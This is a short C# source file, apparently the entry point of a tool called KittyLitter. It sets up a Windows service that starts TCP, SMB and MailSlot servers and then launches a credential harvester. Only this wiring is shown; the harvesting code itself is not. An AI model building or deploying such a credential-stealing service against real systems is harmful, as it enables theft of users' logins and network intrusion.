using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using KittyLitter.IPCServers;
using System.Threading;
using System.ServiceProcess;

namespace KittyLitter
{
    class Program : ServiceBase
    {
        public void Worker()
        {
            TCPServer tcp = new TCPServer();
            SMBServer smb = new SMBServer();
            MailSlotServer mail = new MailSlotServer();
            IPCServer[] servers = new IPCServer[] { tcp, smb, mail };
            foreach (var server in servers)
            {
                Thread t = new Thread(() => server.ServeServer());
                t.Start();
            }
            CredHarvester.Start();
        }

        static void Main(string[] args)
        {
            
        }
    }
}
